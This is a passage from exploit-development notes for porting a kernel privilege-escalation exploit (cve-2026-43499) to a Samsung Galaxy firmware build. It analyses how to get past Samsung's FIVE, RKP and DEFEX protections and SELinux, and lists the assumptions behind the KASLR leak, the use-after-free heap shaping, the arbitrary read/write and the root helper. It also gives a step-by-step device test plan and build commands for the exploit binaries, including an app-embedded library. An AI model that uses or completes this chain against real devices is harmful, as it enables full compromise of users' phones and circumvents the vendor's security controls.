  compile `ALLOW_PERMISSIVE_SELINUX` as false and ignore the permissive
  cmdline, so stock init should be enforcing. Samsung init also references
  `ro.build.selinux.enforce`, which is not set in the extracted properties.
  Check `getenforce`, `/sys/fs/selinux/enforce`, and
  `getprop ro.boot.selinux` on the device before assuming permissive.

### 9.6 FIVE, RKP, and DEFEX

* `five_ptrace` exists at `0xffffff80083fd428`. Request `0x4205`
  (`PTRACE_SETREGSET`) falls into the audit path at `0xffffff80083fd474`,
  which pushes a `"ptrace"` / `"reset-integrity"` event and returns 0.
  It does not block the request, but it may flag the task.
* `five_bprm_check` and `five_file_verify` are present, so the UMH helper
  path may be subject to file-integrity verification.
* `rkp_init` calls `uh_call` and sets an enable flag; the DTB reserves
  `rkp_region@9FA00000` (15 MiB). RKP is present and initialized.
* `defex_get_features` returns `0x81` (features 0 and 7 enabled), and
  `defex_syscall_enter`/`task_defex_enforce` can zero credentials and send
  SIGKILL on a detected privilege escalation. DEFEX is present and
  enabled according to its own feature mask.

The arbitrary read/write primitives operate on heap objects and direct-map
data, so static analysis cannot decide whether RKP reverts the
`selinux_enforcing` write or whether FIVE/DEFEX rejects the UMH helper.
The root stage therefore remains unproven. Prefer a signed interpreter
(e.g. `/system/bin/sh`) over an unsigned helper if FIVE turns out to be
enforcing.



## 10. Unverified assumptions and hardware test plan

Nothing below has been observed on a real device.

1. The exact physical placement of `_text` inside the XBL `"Kernel"`
   region, the physical slide range, and the `0x1f0000` fingerprint
   probe. The region base and `text_offset` are confirmed; the placement
   is not.
2. `MM_ORDER = 3` (SLUB `min_objects` and Samsung boot parameters) and the
   aligned object stride `0x380` (36 objects/slab). The requested
   `mm_struct` size is confirmed as `0x348` by `proc_caches_init`; the
   stride is derived from `SLAB_HWCACHE_ALIGN` plus the 64-byte cache
   line and must be confirmed with `/sys/kernel/slab/mm_struct`.
3. 4.9 `struct page`/memcg behavior in the pipe heap-shaping stage.
4. The waiter geometry in section 5 (static disassembly only).
5. The runtime SELinux state. The `ptrace` allow rule is present in the
   platform policy, but the boot cmdline and `ro.build.selinux=1` disagree
   about permissive mode; check `getenforce` before trusting it.
6. `five_ptrace` treating request `0x4205` as non-blocking. Static
   disassembly says it takes the audit path and returns 0, but the
   `"reset-integrity"` side effect is not understood.
7. The two-byte collateral being harmless at every remaining
   `configfs_write_once()` call site. In particular,
   `restore_p0_oracle_pages()` writes `compound_head` at `struct page+0x20`,
   so the legacy path also zeroes `+0x28..+0x29`; the 4.9 meaning of that
   field for the pipe probe pages is unverified.
8. The 4.9 workqueue offsets used by the UMH installer.
9. `SKB_DATA_DELTA`. The direct-map/VMEMMAP relationship is confirmed by
   the `address_markers` table (section 9.4), and the 0xE80 delta is now
   confirmed from `__alloc_skb`'s 0x180 `skb_shared_info` reservation
   (section 4.4). Whether the freed `mm_struct` slab actually becomes the
   first fragment page is still hardware-unverified.
10. RKP/DEFEX/FIVE not rejecting the credential, SELinux, or page-table
    writes, or the unsigned UMH helper. Their presence and feature masks
    are confirmed; their runtime effect on this chain is not.
11. The runtime seccomp state. The `arm64_app_filter` in this firmware
    allows syscall 117, but the actual filter installed in the target app
    process must be confirmed.
12. `HARDENED_USERCOPY` accepting the 0x210-byte copy into `fpr_set`'s stack
    buffer.
13. The real `init_task` PI walk not causing an unrecoverable side effect.
14. The fake rb parent (`nfulnl_logger`) not corrupting `logfn` or other live
    nf_logger fields during the chain walk.
15. `memstart_addr == 0x80000000` (i.e. `kaslr-seed >> 48 == 0`). A full
    64-bit seed randomizes `PHYS_OFFSET`, and the fixed direct-map aliases,
    `direct_to_page()`, and the P0 oracle then address a shifted physical
    page. The port fails its fingerprint/alias checks in that case; it does
    not currently leak or adapt to `memstart_addr`.
16. The physical/virtual slide equality. With no `kaslr-seed`, a sub-2MiB
    physical misalignment is copied into `x23` and yields matching virtual
    and physical slides. A 2 MiB-aligned placement outside the first 2 MiB
    (`x23 == 0`), or an injected seed, breaks that equality; text addresses
    then use the wrong base even when the P0 scan succeeds.

Recommended order on a sacrificial device:

1. Record `ro.build.fingerprint`, `ro.boot.bootloader`, `uname -a`, and the
   `/proc/version` string; confirm the image is `G965U1UES6CSG4`.
2. Read `/sys/kernel/slab/mm_struct/order` (expect 3),
   `/sys/kernel/slab/mm_struct/object_size` (expect 840),
   `/sys/kernel/slab/mm_struct/objs_per_slab` (expect 36),
   `/sys/devices/system/cpu/possible` (expect 0-7, i.e. futex table 2048),
   `/proc/cmdline`
   (no `slub_debug`/`slub_min_objects`/`slub_max_order`), the tracefs event
   ID, `/proc/sys/kernel/yama/ptrace_scope`, `/proc/self/status` seccomp
   fields, and `/sys/fs/selinux/enforce`. Also check
   `getprop ro.boot.selinux` and `getprop ro.build.selinux.enforce`.
3. Confirm the virtual layout from the boot log
   (`dmesg | grep -A12 "Virtual kernel memory layout"`) or, if readable,
   `/proc/kallsyms` for `_text`; the expected linear map starts at
   `0xffffffc000000000` and vmemmap at `0xffffffbf00000000`.
4. Run the KASLR leak in isolation (`SLIDE_ONLY=1`) and compare the recovered
   base with a known symbol.
5. Trigger and observe the UAF/waiter state before adding the stack writer.
6. Enable the PTRACE writer with verbose logging and confirm the ptrace return
   value, the consumer's `sched_setattr` result, and the stack-write window.
7. Validate arbitrary read, then arbitrary write, then the fops restore and
   the misc/boot_id restores.
8. Only then attempt the UMH root helper.
9. Keep the target out of `support/targets-v3.json` until all of the above
   pass and the artifacts are rebuilt from a complete firmware package.

## 11. Build

The port builds with NDK r29:

```sh
make TARGET=star2qlteue-G965U1UES6CSG4 API=28 \
  ANDROID_NDK_HOME=/tmp/opencode/android-ndk-r29 \
  build/star2qlteue-G965U1UES6CSG4/cve-2026-43499 \
  build/star2qlteue-G965U1UES6CSG4/cve-2026-43499-app.so
```

The research-only release variant also fits the 104,128-byte app slot:

```sh
make TARGET=star2qlteue-G965U1UES6CSG4 API=28 \
  ANDROID_NDK_HOME=/tmp/opencode/android-ndk-r29 \
  build/star2qlteue-G965U1UES6CSG4/cve-2026-43499-app.release.so
```

Only the app variants select `SLIDE_STACK_WRITER=3`. The non-app
`cve-2026-43499` preload still compiles the default pselect path, which cannot
reach the 4.9 waiter; it is built for parity, not as a validated shell route.

Current local artifacts (not published), rebuilt after the direct-map
correction in section 9.4 and the `mm_struct` stride correction in
section 4.1:

```text
cve-2026-43499                  108,008 bytes
  93945c2a2a04a37d63dad3ff7f4746dfb2212f90a05a02a794e2996a898d8fb5
cve-2026-43499-app.so           124,856 bytes  (debug)
  bbb34de97d179f0286265788fbee5887185009646a3a56f79a874c87e7366540
cve-2026-43499-app.release.so   104,128 bytes  (release)
  b5c6b5499715b11e78f16968283b699dd92fbca3327e7e91f5903f6b2e4e030f
cve-2026-43499-root              26,856 bytes
  3cf4ac0b85f69fe6bed224715a2fe1c69892299b9abd827806ee331f83b2cfb5
test bundle zip                 112,338 bytes
  13b1db91ff7d3a72a6682e8684be1305afd313e0c4a313923f40e193b32e1db8
```

In the test bundle the release build is named `cve-2026-43499-app.so` and
the debug build is `cve-2026-43499-app.debug.so`.

The release build uses `-Oz`, `--gc-sections`, and `--icf=all`. The debug app
`.so` is 124,856 bytes; the release target is truncated to exactly 104,128
bytes by the Makefile. The release binary was checked for the PTRACE
constants: it contains `0x4205`, syscall 117, waiter offset `0xb0`, and buffer
size `0x210`, and no `0x4204`.

No binary from this profile is committed to the public feed. The target stays
research-only until hardware validation.
